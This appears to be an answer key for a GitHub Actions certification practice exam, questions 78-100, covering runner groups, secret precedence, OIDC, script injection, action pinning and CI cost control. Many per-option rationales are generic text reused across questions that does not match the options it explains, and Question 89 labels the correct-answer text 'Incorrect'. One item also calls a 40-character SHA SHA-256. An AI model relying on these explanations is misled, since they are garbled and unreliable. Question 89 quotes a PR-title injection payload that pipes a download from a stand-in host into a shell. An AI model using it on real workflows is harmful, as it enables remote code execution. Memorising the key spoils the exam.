Correct answer: C (is correct). Scope `Repository access` to the selected `2` PCI repositories (`with Allow public repositories UNCHECKED`) AND enable `Restrict workflows that can run on this runner group` pinned to central workflow `kestrelpay/sec-workflows/.github/workflows/hsm-sign.yml@<sha>`. [Skill 4.6: Organize runner groups, restrict access, and monitor or troubleshoot runner health and performance | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Correct. Runner Groups enforce multi-tenant blast-radius boundaries down to approved workflow YAML paths, while `_diag/Runner_*.log` (listener) and `Worker_*.log` (job) speed triage.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 79 — `C, E` (Manage GitHub Actions for the enterprise)

Correct answers: C and E (are correct). Runner label matching uses logical `AND` (`an online runner inside group pci-hsm-prod must advertise EVERY requested label`), OR the caller repository / workflow ref is excluded by the `pci-hsm-prod` Runner Group's repository or workflow access list. [Skill 4.6: Organize runner groups, restrict access, and monitor or troubleshoot runner health and performance | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Correct. Runner Groups enforce multi-tenant blast-radius boundaries down to approved workflow YAML paths, while `_diag/Runner_*.log` (listener) and `Worker_*.log` (job) speed triage.
- **D:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **E:** Correct. Scoped Runner Groups + ephemeral single-job runners protect enterprise compute and internal networks.
- **F:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.

### Question 80 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). Running `sudo ./svc.sh install <user>` followed by `sudo ./svc.sh start` (`and ./svc.sh status`) registers the GitHub Actions runner listener as a managed `systemd` service on Linux (`or launchd on macOS / Windows Service on Windows`) that restarts automatically across reboots. [Skill 4.6: Organize runner groups, restrict access, and monitor or troubleshoot runner health and performance | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)]

- **A:** Correct. Runner Groups enforce multi-tenant blast-radius boundaries down to approved workflow YAML paths, while `_diag/Runner_*.log` (listener) and `Worker_*.log` (job) speed triage.
- **B:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.

### Question 81 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). Pre-install SDKs under `$RUNNER_TOOL_CACHE/<ToolName>/<SemVer>/<arch>/` (`for example /opt/hostedtoolcache/Python/3.12.7/x64/`) alongside an empty `<arch>.complete` marker file so `actions/setup-python` discovers and activates the cached runtime offline. [Skill 4.7: Customize, preconfigure, and maintain runner images and software dependencies | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/using-github-hosted-runners/customizing-github-hosted-runners)]

- **A:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **D:** Correct. Official `actions/setup-*` actions check `$RUNNER_TOOL_CACHE` on hosted/self-hosted runners before downloading, avoiding slow `apt-get` builds on every run.

### Question 82 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). GitHub publishes official Packer templates and software manifests in `actions/runner-images`, and self-hosted runner admins can set `ACTIONS_RUNNER_HOOK_JOB_STARTED` and `ACTIONS_RUNNER_HOOK_JOB_COMPLETED` on the runner host (`not inside untrusted repo YAML`) to enforce pre/post-job hygiene scripts. [Skill 4.7: Customize, preconfigure, and maintain runner images and software dependencies | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/using-github-hosted-runners/customizing-github-hosted-runners)]

- **A:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Correct. Official `actions/setup-*` actions check `$RUNNER_TOOL_CACHE` on hosted/self-hosted runners before downloading, avoiding slow `apt-get` builds on every run.

### Question 83 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). GitHub Actions resolves identically named `secrets.*` and `vars.*` from most specific to broadest scope (`Environment > Repository > Organization`), so `production` Environment secret `https://prod.kestrel.io` overrides both Repository and Organization values. [Skill 4.8: Define scope, precedence, and access controls for encrypted secrets and configuration variables at enterprise, organization, repository, and environment levels | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions)]

- **A:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **B:** Correct. Both `secrets.*` and `vars.*` resolve by specificity (`Environment` overrides `Repository`, which overrides `Organization`), and Org secrets should scope to `Selected repositories`.
- **C:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **D:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.

### Question 84 — `E, F` (Manage GitHub Actions for the enterprise)

Correct answers: E and F (are correct). Individual Actions secrets are encrypted at rest/masked in logs up to `48 KB` each (`up to 1,000 org secrets, 100 repo secrets, and 100 per environment; names cannot start with GITHUB_`), whereas `vars.*` configuration variables store plaintext values readable directly in UI/logs and job-level `if:` conditions. [Skill 4.8: Define scope, precedence, and access controls for encrypted secrets and configuration variables at enterprise, organization, repository, and environment levels | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **C:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **E:** Correct. Environment secrets take highest precedence (`gated by reviewers/branches`), REST updates require LibSodium sealed boxes, and `vars.*` keeps non-secret config readable.
- **F:** Correct. Both `secrets.*` and `vars.*` resolve by specificity (`Environment` overrides `Repository`, which overrides `Organization`), and Org secrets should scope to `Selected repositories`.

### Question 85 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). First call `GET /repos/kestrelpay/ledger-api/actions/secrets/public-key` to retrieve the repository's Base64 public `key` and `key_id`, then encrypt the UTF-8 secret client-side using LibSodium asymmetric sealed-box (`crypto_box_seal`) and Base64-encode the ciphertext as `encrypted_value`. [Skill 4.9: Manage secrets programmatically and in workflows using the GitHub REST API and secure handling practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/rest/actions/secrets)]

- **A:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **B:** Correct. The Actions Secrets REST API accepts only client-side LibSodium sealed-box `encrypted_value` + `key_id`, whereas `/actions/variables` manages plain-text config strings.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.

### Question 86 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). GitHub's Actions Secrets REST API is strictly write-only for secret values: `GET /orgs/{org}/actions/secrets/{secret_name}` returns metadata only (`name`, `created_at`, `updated_at`, `visibility`, `selected_repositories_url`) and NEVER returns plaintext or ciphertext values. [Skill 4.9: Manage secrets programmatically and in workflows using the GitHub REST API and secure handling practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/rest/actions/secrets)]

- **A:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **B:** Correct. The Actions Secrets REST API accepts only client-side LibSodium sealed-box `encrypted_value` + `key_id`, whereas `/actions/variables` manages plain-text config strings.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.

### Question 87 — `C` (Secure and optimize automation)

Correct answer: C (is correct). Configure `Required reviewers` (`up to 6 users/teams`) with `Prevent self-review` checked, set `Deployment branches and tags` to `Selected branches and tags` (`v*.*.*`), and attach a GitHub App custom deployment protection rule (`deployment_protection_rule` webhook). [Skill 5.1: Configure deployment environments, protection rules, required reviewers, and vet Marketplace actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Deployment Environments hold production secrets/OIDC until human and webhook gates pass, and `Verified creator` badges indicate partner identity (`still audit source & pin 40-char SHA!`).
- **D:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.

### Question 88 — `D` (Secure and optimize automation)

Correct answer: D (is correct). No — `Verified creator` confirms GitHub verified the publisher organization's identity, NOT a source-code security audit or tag immutability; AppSec must still audit `action.yml`/`dist/`, check permissions, and pin approved releases to a full 40-character commit SHA. [Skill 5.1: Configure deployment environments, protection rules, required reviewers, and vet Marketplace actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **D:** Correct. Deployment Environments hold production secrets/OIDC until human and webhook gates pass, and `Verified creator` badges indicate partner identity (`still audit source & pin 40-char SHA!`).

### Question 89 — `C` (Secure and optimize automation)

Correct answer: C (is correct). No — `${{ ... }}` expressions inside `run:` are interpolated by GitHub Actions BEFORE bash parses the script, so double quotes inside the PR title break out of quoting and execute arbitrary shell commands; bind `PR_TITLE: ${{ github.event.pull_request.title }}` in `env:` and reference `"$PR_TITLE"` instead. [Skill 5.2: Identify and mitigate untrusted input and script injection risks in workflows and actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)]

- **A:** Incorrect. Built-in expression functions enable dynamic JSON matrices (`fromJSON`) and lockfile cache keys (`hashFiles`) without shell-parsing overhead.
- **B:** Incorrect. GitHub expands `${{ ... }}` **before** handing `run:` text to `bash`/`pwsh`; binding untrusted text into an `env:` variable keeps shell metacharacters (`$(...)`, backticks) inert.
- **C:** Correct. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.
- **D:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — `${{ ... }}` expressions inside `run:` are interpolated by GitHub Actions BEFORE bash parses the script, so double quotes inside the PR title break out of quoting and execute arbitrary shell commands; bind `PR_TITLE: ${{ github.event.pull_request.title }}` in `env:` and reference `"$PR_TITLE"` instead.

### Question 90 — `D, F` (Secure and optimize automation)

Correct answers: D and F (are correct). Never pass untrusted `github.event.*` fields (`title`, `body`, `head.ref`, commit messages) directly inside `run:`; bind them through step `env:` variables (`"$UNTRUSTED_VAL"`), and NEVER checkout or execute untrusted fork PR `head.sha` code inside a privileged `pull_request_target` workflow. [Skill 5.2: Identify and mitigate untrusted input and script injection risks in workflows and actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Incorrect. Never checkout and build untrusted fork `pull_request.head.sha` inside `pull_request_target`; run untrusted tests in unprivileged `on: pull_request` instead.
- **C:** Incorrect. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.
- **D:** Correct. GitHub expands `${{ ... }}` **before** handing `run:` text to `bash`/`pwsh`; binding untrusted text into an `env:` variable keeps shell metacharacters (`$(...)`, backticks) inert.
- **E:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **F:** Correct. Binding untrusted event fields to `env:` variables stops shell command injection, and avoiding fork checkouts in `pull_request_target` prevents secret exfiltration.

### Question 91 — `C` (Secure and optimize automation)

Correct answer: C (is correct). Mint a short-lived GitHub App installation access token at runtime (`via actions/create-github-app-token@<sha>`) scoped strictly to `kestrelpay/helm-charts` (`contents: write`, `pull-requests: write`), which expires after 1 hour (`or job revoke`) and triggers downstream CI cleanly. [Skill 5.3: Apply least-privilege permissions to GITHUB_TOKEN and manage cross-repository authentication tokens | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **C:** Correct. `GITHUB_TOKEN` is ephemeral to a single job and scoped strictly to the current repository; cross-repo automation should mint 1-hour GitHub App tokens via `actions/create-github-app-token`.
- **D:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.

### Question 92 — `B` (Secure and optimize automation)

Correct answer: B (is correct). Each job's automatic `GITHUB_TOKEN` is scoped strictly to the single repository running the workflow (`never cross-repo write`), carries `packages: write` only during `publish-ghcr`, and is automatically revoked as soon as the job finishes (`or after 24 hours max`). [Skill 5.3: Apply least-privilege permissions to GITHUB_TOKEN and manage cross-repository authentication tokens | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Correct. `GITHUB_TOKEN` is ephemeral to a single job and scoped strictly to the current repository; cross-repo automation should mint 1-hour GitHub App tokens via `actions/create-github-app-token`.
- **C:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 93 — `A` (Secure and optimize automation)

Correct answer: A (is correct). When a job declares `environment: production`, GitHub sets the OIDC JWT `sub` claim to `repo:kestrelpay/settlement-gw:environment:production` (`rather than a ref branch claim`), preventing non-environment feature branches or sibling repos from assuming the production role. [Skill 5.4: Configure OpenID Connect (OIDC) for federated authentication to cloud providers and external vaults | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect)]

- **A:** Correct. OIDC mints short-lived per-job JWTs; cloud trust policies must pin `sub` (`e.g., repo:org/app:environment:production`) and `aud` so other repos or feature branches cannot assume roles.
- **B:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **C:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **D:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.

### Question 94 — `D` (Secure and optimize automation)

Correct answer: D (is correct). Gating `production` Environment (`reviewers`, `main`), pinning cloud OIDC `aud` & `sub: repo:<o>/<r>:environment:production`, setting `environment: production` + `id-token: write`, and exchanging short-lived JWTs at runtime eliminates static cloud secrets. [Skill 5.4: Configure OpenID Connect (OIDC) for federated authentication to cloud providers and external vaults | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect)]

- **A:** Incorrect. GitHub withholds Environment tokens until protection gates pass, and `pull_request_target` + fork checkout leaks credentials.
- **B:** Incorrect. OIDC JWTs expire in minutes and are minted dynamically per job run, never stored statically.
- **C:** Incorrect. Wildcard `repo:*:*` lets external repos assume your cloud role, and omitting `id-token: write` or `environment:` breaks OIDC gating.
- **D:** Correct. Pairing `environment: production` with `id-token: write` gates job execution and emits the `repo:<org>/<repo>:environment:production` `sub` claim.

### Question 95 — `A` (Secure and optimize automation)

Correct answer: A (is correct). Signing GitHub Artifact Attestations requires `permissions: { id-token: write, attestations: write, contents: read }`, and `gh attestation verify ... -R <org>/<repo> --signer-workflow <org>/<repo>/.github/workflows/<file>.yml` cryptographically verifies the exact workflow signer. [Skill 5.5: Enforce action pinning, supply-chain security controls, and artifact attestations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds)]

- **A:** Correct. Full 40-character SHA pinning + Immutable Actions prevent upstream tag hijacking, while Sigstore-backed Artifact Attestations prove cryptographic build provenance at deploy time.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **D:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.

### Question 96 — `C` (Secure and optimize automation)

Correct answer: C (is correct). Git tags (`@v3`, `@v3.1.2`) and branch names (`@main`) are mutable pointers unless protected by Immutable Actions/Releases; a compromised maintainer token can force-retarget `@v3` to malicious code, whereas a full 40-character SHA (`SHA-1/SHA-256`) pins exact content. [Skill 5.5: Enforce action pinning, supply-chain security controls, and artifact attestations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds)]

- **A:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Correct. Full 40-character SHA pinning + Immutable Actions prevent upstream tag hijacking, while Sigstore-backed Artifact Attestations prove cryptographic build provenance at deploy time.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 97 — `C` (Secure and optimize automation)

Correct answer: C (is correct). Set `retention-days: 2` on `actions/upload-artifact@v4` (`or lower Organization/Repository Settings -> Actions -> General -> Artifact and log retention`), and prune obsolete existing artifacts programmatically via `DELETE /repos/{owner}/{repo}/actions/artifacts/{artifact_id}`. [Skill 5.6: Optimize workflow execution time and storage using caching, artifact policies, and selective execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/permissions#get-artifact-and-log-retention-settings-for-an-organization)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **C:** Correct. Right-sizing `retention-days` (`e.g., 5–14d instead of 90d default`) and configuring `/orgs/{org}/actions/permissions/artifact-and-log-retention` slashes metered GB-month storage.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 98 — `A, C` (Secure and optimize automation)

Correct answers: A and C (are correct). Enable lockfile-keyed dependency caching (`actions/setup-node@v4` with `cache: 'npm'` or `actions/cache@v4` keyed on `${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}` plus `restore-keys`), and skip unnecessary runs via `paths-ignore` or a lightweight path-filter gate job. [Skill 5.6: Optimize workflow execution time and storage using caching, artifact policies, and selective execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/permissions#get-artifact-and-log-retention-settings-for-an-organization)]

- **A:** Correct. Canceling superseded PR runs, caching lockfile dependencies, shortening artifact retention, and right-sizing runner OS tiers cut CI latency and metered cost.
- **B:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **C:** Correct. Right-sizing `retention-days` (`e.g., 5–14d instead of 90d default`) and configuring `/orgs/{org}/actions/permissions/artifact-and-log-retention` slashes metered GB-month storage.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **E:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **F:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 99 — `C` (Secure and optimize automation)

Correct answer: C (is correct). Standard hosted billing multipliers charge macOS at ~`10x` and Windows at `2x` relative to standard Linux (`1x`), so running PR checks on Linux (`or single-vCPU container runner ubuntu-slim for lightweight automation`) and reserving macOS/Windows for merges slashes spend. [Skill 5.7: Reduce runner cost and resource consumption using concurrency controls, runner sizing, and matrix optimization | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/control-the-concurrency-of-workflows-and-jobs)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Correct. Canceling superseded PR runs, skipping doc-only pushes, avoiding 10x macOS runners for Linux workloads, and capping `timeout-minutes` eliminate wasted billable minutes.
- **D:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.

### Question 100 — `B` (Secure and optimize automation)

Correct answer: B (is correct). Add `concurrency: { group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}, cancel-in-progress: true }` to abort stale runs immediately, and prune PR matrices to primary Linux targets while running full multi-OS matrices on `main` / `merge_group`. [Skill 5.7: Reduce runner cost and resource consumption using concurrency controls, runner sizing, and matrix optimization | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/control-the-concurrency-of-workflows-and-jobs)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Correct. Canceling superseded PR runs, skipping doc-only pushes, avoiding 10x macOS runners for Linux workloads, and capping `timeout-minutes` eliminate wasted billable minutes.
- **C:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
